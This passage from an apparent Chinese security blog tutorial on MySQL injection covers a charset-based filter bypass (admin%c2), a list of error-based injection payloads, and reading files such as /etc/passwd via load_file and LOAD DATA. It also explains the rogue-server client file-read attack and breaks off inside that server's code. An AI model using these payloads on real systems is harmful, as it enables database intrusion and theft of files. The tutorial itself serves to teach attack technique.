class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//该代码节选自：离别歌&#x27;s blog</span></span><br><span class="line"><span class="variable">$mysqli</span> = <span class="keyword">new</span> mysqli(<span class="string">&quot;localhost&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;cat&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* check connection */</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$mysqli</span>-&gt;connect_errno) &#123;</span><br><span class="line">    printf(<span class="string">&quot;Connect failed: %s\n&quot;</span>, <span class="variable">$mysqli</span>-&gt;connect_error);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$mysqli</span>-&gt;query(<span class="string">&quot;set names utf8&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = addslashes(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//我们在其基础上添加这么一条语句。</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$username</span> === <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;You can&#x27;t do this.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Select queries return a resultset */</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM `table1` WHERE username=&#x27;<span class="subst">&#123;$username&#125;</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span> = <span class="variable">$mysqli</span>-&gt;query( <span class="variable">$sql</span> )) &#123;</span><br><span class="line">    printf(<span class="string">&quot;Select returned %d rows.\n&quot;</span>, <span class="variable">$result</span>-&gt;num_rows);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;fetch_array(MYSQLI_ASSOC))</span><br><span class="line">    &#123;</span><br><span class="line">        var_dump(<span class="variable">$row</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* free result set */</span></span><br><span class="line">    <span class="variable">$result</span>-&gt;close();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    var_dump(<span class="variable">$mysqli</span>-&gt;error);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$mysqli</span>-&gt;close();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>建表语句如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE &#96;table1&#96; (</span><br><span class="line">  &#96;id&#96; int(10) unsigned NOT NULL AUTO_INCREMENT,</span><br><span class="line">  &#96;username&#96; varchar(255) COLLATE latin1_general_ci NOT NULL,</span><br><span class="line">  &#96;password&#96; varchar(255) COLLATE latin1_general_ci NOT NULL,</span><br><span class="line">  PRIMARY KEY (&#96;id&#96;)</span><br><span class="line">) ENGINE&#x3D;MyISAM AUTO_INCREMENT&#x3D;1 DEFAULT CHARSET&#x3D;latin1 COLLATE&#x3D;latin1_general_ci;</span><br></pre></td></tr></table></figure><p>我们设置表的编码为latin1，事实上，就算你不填写，默认编码便是latin1。</p><p>我们往表中添加一条数据：<code>insert table1 VALUES(1,&#39;admin&#39;,&#39;admin&#39;);</code></p><p>注意查看源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$username</span> === <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;You can&#x27;t do this.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们对用户的输入进行了判断，若输入内容为admin，直接结束代码输出返回，并且还对输出的内容进行addslashes处理，使得我们无法逃逸出单引号。</p><p>这样的话，我们该怎样绕过这个限制，让页面输出admin的数据呢？</p><p>我们注意到：<code>$mysqli-&gt;query(&quot;set names utf8&quot;);</code>这么一行代码，在连接到数据库之后，执行了这么一条SQL语句。</p><p>上边在gbk宽字节注入的时候讲到过：<code>set names utf8;</code>相当于：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt;SET character_set_client &#x3D;&#39;utf8&#39;;</span><br><span class="line">mysql&gt;SET character_set_results &#x3D;&#39;utf8&#39;;</span><br><span class="line">mysql&gt;SET character_set_connection &#x3D;&#39;utf8&#39;;</span><br></pre></td></tr></table></figure><p>前边说道：PHP的编码是<code>UTF-8</code>，而我们现在设置的也是<code>UTF-8</code>，怎么会产生问题呢？</p><p>别着急，让我接着往下说。前边我们提到：SQL语句会先转成<code>character_set_client</code>设置的编码。但，他接下来还会继续转换。<code>character_set_client</code>客户端层转换完毕之后，数据将会交给<code>character_set_connection</code>连接层处理，最后在从<code>character_set_connection</code>转到数据表的内部操作字符集。</p><p>来本例中，字符集的转换为：<code>UTF-8—&gt;UTF-8-&gt;Latin1</code></p><p>这里需要讲一下UTF-8编码的一些内容。</p><blockquote><p>UTF-8编码是变长编码，可能有1~4个字节表示：</p><ol><li>一字节时范围是<code>[00-7F]</code></li><li>两字节时范围是<code>[C0-DF][80-BF]</code></li><li>三字节时范围是<code>[E0-EF][80-BF][80-BF]</code></li><li>四字节时范围是<code>[F0-F7][80-BF][80-BF][80-BF]</code></li></ol><p>然后根据RFC 3629规范，又有一些字节值是不允许出现在UTF-8编码中的：</p><p><img src="https://img.0x002.com/article/MysqlSQLi/utf8.jpg" alt="UTF8编码"></p><p>所以最终，UTF-8第一字节的取值范围是：00-7F、C2-F4。</p><p>关于所有的UTF-8字符，你可以在这个表中一一看到： <a href="http://utf8-chartable.de/unicode-utf8-table.pl">http://utf8-chartable.de/unicode-utf8-table.pl</a></p><p>引自：<a href="https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html">Mysql字符编码利用技巧</a></p></blockquote><p>利用这一特性，我们输入：<code>?username=admin%c2</code>，<code>%c2</code>是一个Latin1字符集不存在的字符。</p><p>由上述，可以简单的知道：%00-%7F可以直接表示某个字符、%C2-%F4不可以直接表示某个字符，他们只是其他长字节编码结果的首字节。</p><p>但是，这里还有一个Trick：Mysql所使用的UTF-8编码是阉割版的，仅支持三个字节的编码。所以说，Mysql中的UTF-8字符集只有最大三字节的字符，首字节范围：<code>00-7F、C2-EF</code>。</p><p>而对于不完整的长字节UTF-8编码的字符，若进行字符集转换时，会直接进行忽略处理。</p><p>利用这一特性，我们的payload为<code>?username=admin%c2</code>，此处的<code>%c2</code>换为<code>%c2-%ef</code>均可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM &#96;table1&#96; WHERE username&#x3D;&#39;admin&#39;</span><br></pre></td></tr></table></figure><p>因为<code>admin%c2</code>在最后一层的内部操作字符集转换中变成<code>admin</code>。</p><h2 id="报错注入原理"><a href="#报错注入原理" class="headerlink" title="报错注入原理"></a>报错注入原理</h2><p>我们前边说到，报错注入是通过特殊函数错误使用并使其输出错误结果来获取信息的。</p><p>那么，我们具体来说说，都有哪些特殊函数，以及他们都该怎么使用。</p><p>MySQL的报错注入主要是利用MySQL的一些逻辑漏洞，如BigInt大数溢出等，由此可以将MySQL报错注入分为以下几类：</p><ul><li>BigInt等数据类型溢出</li><li>函数参数格式错误</li><li>主键/字段重复</li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp()"></a>exp()</h3><p>函数语法：<code>exp(int)</code></p><p>适用版本：5.5.5~5.5.49</p><p>该函数将会返回e的x次方结果。正常如下图：</p><p><img src="https://img.0x002.com/article/MysqlSQLi/expRight.png" alt="exp函数正常执行"></p><p>为什么会报错呢？我们知道，次方到后边每增加1，其结果都将跨度极大，而mysql能记录的double数值范围有限，一旦结果超过范围，则该函数报错。如下图：</p><p><img src="https://img.0x002.com/article/MysqlSQLi/expError.png" alt="exp错误执行"></p><p>我们的payload为：<code>exp(~(select * from(select user())a))</code></p><p>其中，~符号为运算符，意思为一元字符反转，通常将字符串经过处理后变成大整数，再放到exp函数内，得到的结果将超过mysql的double数组范围，从而报错输出。至于为什么需要用两层子查询，这点我暂时还没有弄明白，欢迎有了解的大牛找我讨论: )</p><p>除了<code>exp()</code>之外，还有类似<code>pow()</code>之类的相似函数同样是可利用的，他们的原理相同。</p><h3 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h3><p>函数语法：<code>updatexml(XML_document, XPath_string, new_value);</code></p><p>适用版本: 5.1.5+</p><p>我们通常在第二个xpath参数填写我们要查询的内容。</p><p>与exp()不同，updatexml是由于参数的格式不正确而产生的错误，同样也会返回参数的信息。</p><p>payload: <code>updatexml(1,concat(0x7e,(select user()),0x7e),1)</code></p><p>前后添加~使其不符合xpath格式从而报错。</p><h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h3><p>函数语法：<code>EXTRACTVALUE (XML_document, XPath_string);</code></p><p>适用版本：5.1.5+</p><p>利用原理与updatexml函数相同</p><p>payload: <code>and (extractvalue(1,concat(0x7e,(select user()),0x7e)))</code></p><h3 id="rand-group-count"><a href="#rand-group-count" class="headerlink" title="rand()+group()+count()"></a>rand()+group()+count()</h3><p>虚拟表报错原理：简单来说，是由于where条件每执行一次，rand函数就会执行一次，如果在由于在统计数据时判断依据不能动态改变，故<code>rand()</code>不能后接在<code>order/group by</code>上。</p><p>举一个例子：假设user表有三条数据，我们通过：<code>select * from user group by username</code> 来通过其中的username字段进行分组。</p><p>此过程会先建立一个<strong>虚拟表</strong>，存在两个字段：<code>key，count</code></p><p>其中我们通过username来判断，其在此处是字段，首先先取第一行的数据：<code>username=test&amp;password=test</code></p><p>username为test出现一次，则现在虚表内查询是否存在test，若存在，则count+1，若不存在，则添加test，其count为1。</p><p>对于<code>floor(rand(0)*2)</code>，其中<code>rand()</code>函数，会生成0~1之间随机一个小数、<code>floor()</code>取整数部分、0是随机因子、乘2是为了让大于0.5的小数通过floor函数得1，否则永远为0。</p><p>若表中有三行数据：我们通过<code>select * from user group by floor(rand(0)*2)</code>进行排序的话。</p><p>注意，由于<code>rand(0)</code>的随机因子是被固定的，故其产生的随机数也被固定了，顺序为：011011…</p><p>首先<code>group by</code>需要执行的话，需要确定分组因子，故<code>floor(rand(0)*2)</code>被执行一次，得到的结果为0，接着在虚表内检索0，发现虚表没有键值为0的记录，故添加上，在进行添加时：<code>floor(rand(0)*2)</code>第二次被执行，得到结果1，故虚表插入的内容为<code>key=1&amp;count=1</code>。</p><p>第二次执行group by时：<code>floor(rand(0)*2)</code>先被运行一次，也就是第三次运行。得到结果1，查询虚表发现数据存在，因而直接让虚表内的key=1的count加一即可，floor(..)只运行了一次。</p><p>第三次执行group by时，floor被执行第四次，得到结果0，查询虚表不存在。再插入虚表时，floor(…)被执行第五次，得到结果1，故此时虚表将插入的值为<code>key=1&amp;count=1</code>，注意，此时虚表已有一条记录为：<code>key=1&amp;count=2</code>，并且字段key为<strong>主键</strong>，具有不可重复性，故虚表在尝试插入时将产生错误。</p><p>图文：</p><blockquote><p>1.查询前默认会建立空虚拟表如下图:</p><p><img src="https://img.0x002.com/article/MysqlSQLi/defaultEmpty.jpg" alt="空的虚拟表"></p><p>2.取第一条记录，执行floor(rand(0)<em>2)，发现结果为0(第一次计算),查询虚拟表，发现0的键值不存在，则floor(rand(0)</em>2)会被再计算一次，结果为1(第二次计算)，插入虚表，这时第一条记录查询完毕，如下图:</p><p><img src="https://img.0x002.com/article/MysqlSQLi/firstCount.jpg" alt="第一次计算"></p><p>\3.查询第二条记录，再次计算floor(rand(0)<em>2)，发现结果为1(第三次计算)，查询虚表，发现1的键值存在，所以floor(rand(0)</em>2)不会被计算第二次，直接count(*)加1，第二条记录查询完毕，结果如下:</p><p><img src="https://img.0x002.com/article/MysqlSQLi/secondCount.jpg" alt="第二次计算"></p><p>4.查询第三条记录，再次计算floor(rand(0)<em>2)，发现结果为0(第4次计算)，查询虚表，发现键值没有0，则数据库尝试插入一条新的数据，在插入数据时floor(rand(0)</em>2)被再次计算，作为虚表的主键，其值为1(第5次计算)，然而1这个主键已经存在于虚拟表中，而新计算的值也为1(主键键值必须唯一)，所以插入的时候就直接报错了。</p><p>5.整个查询过程floor(rand(0)*2)被计算了5次，查询原数据表3次，所以这就是为什么数据表中需要3条数据，使用该语句才会报错的原因。</p><p>引自：——<a href="http://drops.wooyun.org/tips/14312">Mysql报错注入原理分析(count()、rand()、group by)</a></p></blockquote><p>payload用法: <code>union select count(*),2,concat(&#39;:&#39;,(select database()),&#39;:&#39;,floor(rand()*2))as a from information_schema.tables group by a</code></p><h3 id="几何函数"><a href="#几何函数" class="headerlink" title="几何函数"></a>几何函数</h3><ul><li>GeometryCollection：<code>id=1 AND GeometryCollection((select * from (select* from(select user())a)b))</code></li><li>polygon()：<code>id=1 AND polygon((select * from(select * from(select user())a)b))</code></li><li>multipoint()：<code>id=1 AND multipoint((select * from(select * from(select user())a)b))</code></li><li>multilinestring()：<code>id=1 AND multilinestring((select * from(select * from(select user())a)b))</code></li><li>linestring()：<code>id=1 AND LINESTRING((select * from(select * from(select user())a)b))</code></li><li>multipolygon() ：<code>id=1 AND multipolygon((select * from(select * from(select user())a)b))</code></li></ul><h3 id="不存在的函数"><a href="#不存在的函数" class="headerlink" title="不存在的函数"></a>不存在的函数</h3><p>随便适用一颗不存在的函数，可能会得到当前所在的数据库名称。</p><p><img src="https://img.0x002.com/article/MysqlSQLi/noExit.png" alt="不存在的函数报错"></p><h3 id="Bigint数值操作："><a href="#Bigint数值操作：" class="headerlink" title="Bigint数值操作："></a>Bigint数值操作：</h3><p>当mysql数据库的某些边界数值进行数值运算时，会报错的原理。</p><p>如~0得到的结果：18446744073709551615</p><p>若此数参与运算，则很容易会错误。</p><p>payload: <code>select !(select * from(select user())a)-~0;</code></p><h3 id="name-const"><a href="#name-const" class="headerlink" title="name_const()"></a>name_const()</h3><p>仅可取数据库版本信息</p><p>payload: <code>select * from(select name_const(version(),0x1),name_const(version(),0x1))a</code></p><h3 id="uuid相关函数"><a href="#uuid相关函数" class="headerlink" title="uuid相关函数"></a>uuid相关函数</h3><p>适用版本：8.0.x</p><p>参数格式不正确。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT UUID_TO_BIN((SELECT password FROM users WHERE id&#x3D;1));</span><br><span class="line">mysql&gt; SELECT BIN_TO_UUID((SELECT password FROM users WHERE id&#x3D;1));</span><br></pre></td></tr></table></figure><h3 id="join-using-注列名"><a href="#join-using-注列名" class="headerlink" title="join using()注列名"></a>join using()注列名</h3><p>通过系统关键词join可建立两个表之间的内连接。</p><p>通过对想要查询列名的表与其自身建议内连接，会由于冗余的原因(相同列名存在)，而发生错误。</p><p>并且报错信息会存在重复的列名，可以使用 <strong>USING</strong> 表达式声明内连接（INNER JOIN）条件来避免报错。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt;select * from(select * from users a join (select * from users)b)c;</span><br><span class="line">mysql&gt;select * from(select * from users a join (select * from users)b using(username))c;</span><br><span class="line">mysql&gt;select * from(select * from users a join (select * from users)b using(username,password))c</span><br></pre></td></tr></table></figure><h3 id="GTID相关函数"><a href="#GTID相关函数" class="headerlink" title="GTID相关函数"></a>GTID相关函数</h3><p>参数格式不正确。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt;select gtid_subset(user(),1);</span><br><span class="line">mysql&gt;select gtid_subset(hex(substr((select * from users limit 1,1),1,1)),1);</span><br><span class="line">mysql&gt;select gtid_subtract((select * from(select user())a),1);</span><br></pre></td></tr></table></figure><h3 id="报错函数速查表"><a href="#报错函数速查表" class="headerlink" title="报错函数速查表"></a>报错函数速查表</h3><p>注：默认MYSQL_ERRMSG_SIZE=512</p><table><thead><tr><th>类别</th><th>函数</th><th>版本需求</th><th>5.5.x</th><th>5.6.x</th><th style="text-align:center">5.7.x</th><th>8.x</th><th>函数显错长度</th><th>Mysql报错内容长度</th><th>额外限制</th></tr></thead><tbody><tr><td>主键重复</td><td>floor round</td><td>❓</td><td>✔️</td><td>✔️</td><td style="text-align:center">✔️</td><td></td><td>64</td><td></td><td>data_type ≠ varchar</td></tr><tr><td>列名重复</td><td>name_const</td><td>❓</td><td>✔️</td><td>✔️</td><td style="text-align:center">✔️</td><td>✔️</td><td></td><td></td><td>only version()</td></tr><tr><td>列名重复</td><td>join</td><td>[5.5.49, ?)</td><td>✔️</td><td>✔️</td><td style="text-align:center">✔️</td><td>✔️</td><td></td><td></td><td>only columns</td></tr><tr><td>数据溢出 - Double</td><td>1e308 cot exp pow</td><td>[5.5.5, 5.5.48]</td><td>✔️</td><td></td><td style="text-align:center"></td><td></td><td></td><td>MYSQL_ERRMSG_SIZE</td><td></td></tr><tr><td>数据溢出 - BIGINT</td><td>1+~0</td><td>[5.5.5, 5.5.48]</td><td>✔️</td><td></td><td style="text-align:center"></td><td></td><td></td><td>MYSQL_ERRMSG_SIZE</td><td></td></tr><tr><td>几何对象</td><td>geometrycollection linestring multipoint multipolygon multilinestring polygon</td><td>[?, 5.5.48]</td><td>✔️</td><td></td><td style="text-align:center"></td><td></td><td></td><td>244</td><td></td></tr><tr><td>空间函数 Geohash</td><td>ST_LatFromGeoHash ST_LongFromGeoHash ST_PointFromGeoHash</td><td>[5.7, ?)</td><td></td><td></td><td style="text-align:center">✔️</td><td>✔️</td><td>128</td><td></td><td></td></tr><tr><td>GTID</td><td>gtid_subset gtid_subtract</td><td>[5.6.5, ?)</td><td></td><td>✔️</td><td style="text-align:center">✔️</td><td>✔️</td><td>200</td><td></td><td></td></tr><tr><td>JSON</td><td>json_*</td><td>[5.7.8, 5.7.11]</td><td></td><td></td><td style="text-align:center">✔️</td><td></td><td>200</td><td></td><td></td></tr><tr><td>UUID</td><td>uuid_to_bin bin_to_uuid</td><td>[8.0, ?)</td><td></td><td></td><td style="text-align:center"></td><td>✔️</td><td>128</td><td></td><td></td></tr><tr><td>XPath</td><td>extractvalue updatexml</td><td>[5.1.5, ?)</td><td>✔️</td><td>✔️</td><td style="text-align:center">✔️</td><td>✔️</td><td>32</td><td></td></tr></tbody></table><blockquote><p>摘自——<a href="https://blog.sari3l.com/posts/9622f295/">Mysql 注入基础小结</a></p></blockquote><h2 id="文件读-写"><a href="#文件读-写" class="headerlink" title="文件读/写"></a>文件读/写</h2><p>我们知道Mysql是很灵活的，它支持文件读/写功能。在讲这之前，有必要介绍下什么是<code>file_priv</code>和<code>secure-file-priv</code>。</p><p>简单的说：<code>file_priv</code>是对于用户的文件读写权限，若无权限则不能进行文件读写操作，可通过下述payload查询权限。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select file_priv from mysql.user where user&#x3D;$USER host&#x3D;$HOST;</span><br></pre></td></tr></table></figure><p><code>secure-file-priv</code>是一个系统变量，对于文件读/写功能进行限制。具体如下：</p><ul><li>无内容，表示无限制。</li><li>为NULL，表示禁止文件读/写。</li><li>为目录名，表示仅允许对特定目录的文件进行读/写。</li></ul><p>注：<strong>5.5.53本身及之后的版本默认值为NULL，之前的版本无内容</strong>。</p><p>三种方法查看当前<code>secure-file-priv</code>的值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select @@secure_file_priv;</span><br><span class="line">select @@global.secure_file_priv;</span><br><span class="line">show variables like &quot;secure_file_priv&quot;;</span><br></pre></td></tr></table></figure><p>修改：</p><ul><li>通过修改my.ini文件，添加：<code>secure-file-priv=</code></li><li>启动项添加参数：<code>mysqld.exe --secure-file-priv=</code></li></ul><h3 id="读"><a href="#读" class="headerlink" title="读"></a>读</h3><p>Mysql读取文件通常使用load_file函数，语法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(file_path);</span><br></pre></td></tr></table></figure><p>第二种读文件的方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load data infile &quot;&#x2F;etc&#x2F;passwd&quot; into table test FIELDS TERMINATED BY &#39;\n&#39;; #读取服务端文件</span><br></pre></td></tr></table></figure><p>第三种：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load data local infile &quot;&#x2F;etc&#x2F;passwd&quot; into table test FIELDS TERMINATED BY &#39;\n&#39;; #读取客户端文件</span><br></pre></td></tr></table></figure><p>限制：</p><ul><li>前两种需要<code>secure-file-priv</code>无值或为有利目录。</li><li>都需要知道要读取的文件所在的绝对路径。</li><li>要读取的文件大小必须小于<code>max_allowed_packet</code>所设置的值</li></ul><h4 id="低权限读取文件"><a href="#低权限读取文件" class="headerlink" title="低权限读取文件"></a>低权限读取文件</h4><p>5.5.53<code>secure-file-priv=NULL</code>读文件payload，mysql8测试失败，其他版本自测。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">drop table mysql.m1;</span><br><span class="line">CREATE TABLE mysql.m1 (code TEXT );</span><br><span class="line">LOAD DATA LOCAL INFILE &#39;D:&#x2F;&#x2F;1.txt&#39; INTO TABLE mysql.m1 fields terminated by &#39;&#39;;</span><br><span class="line">select * from mysql.m1;</span><br></pre></td></tr></table></figure><h4 id="Mysql连接数据库时可读取文件"><a href="#Mysql连接数据库时可读取文件" class="headerlink" title="Mysql连接数据库时可读取文件"></a>Mysql连接数据库时可读取文件</h4><p>这个漏洞是mysql的一个特性产生的，是上述的第三种读文件的方法为基础的。</p><p>简单描述该漏洞：Mysql客户端在执行<code>load data local</code>语句的时，先想mysql服务端发送请求，服务端接收到请求，并返回需要读取的文件地址，客户端接收该地址并进行读取，接着将读取到的内容发送给服务端。用通俗的语言可以描述如下：</p><blockquote><p>原本的查询流程为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">客户端：我要把我的win.ini文件内容插入test表中</span><br><span class="line">服务端：好，我要你的win.ini文件内容</span><br><span class="line">客户端：win.ini的内容如下....</span><br></pre></td></tr></table></figure><p>假设服务端由我们控制，把一个正常的流程篡改成如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">客户端：我要把我的win.ini文件内容插入test表中</span><br><span class="line">服务端：好，我要你的conn.php内容</span><br><span class="line">客户端：conn.php的内容如下???</span><br></pre></td></tr></table></figure><p>例子部分修改自：<a href="https://paper.seebug.org/1112/">CSS-T | Mysql Client 任意文件读取攻击链拓展</a></p></blockquote><p>换句话说：<code>load data local</code>语句要读取的文件会受到服务端的控制。</p><p>其次，在<a href="https://dev.mysql.com/doc/refman/8.0/en/load-data-local.html">Mysql官方文档对于<code>load data local</code>语句的安全说明</a>中有这么一句话:</p><blockquote><p>A patched server could in fact reply with a file-transfer request to any statement, not just <a href="https://dev.mysql.com/doc/refman/8.0/en/load-data.html"><code>LOAD DATA LOCAL</code></a>, so a more fundamental issue is that clients should not connect to untrusted servers.</p></blockquote><p>意思是：服务器对客户端的文件读取请求实际上是可以返回给客户端发送给服务端的任意语句请求的，不仅仅只是<code>load data local</code>语句。</p><p>这就会产生什么结果呢？之前讲的例子，将可以变成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">客户端：我需要查询test表下的xx内容</span><br><span class="line">服务端：我需要你的conn.php内容</span><br><span class="line">客户端：conn.php的内容如下???</span><br></pre></td></tr></table></figure><p>可以看到，客户端相当于被攻击者给<strong>半劫持</strong>了。</p><p>利用上述的特性，我们通过构造一个恶意的服务端，即可完成上述的过程。</p><p>简易恶意服务端代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span 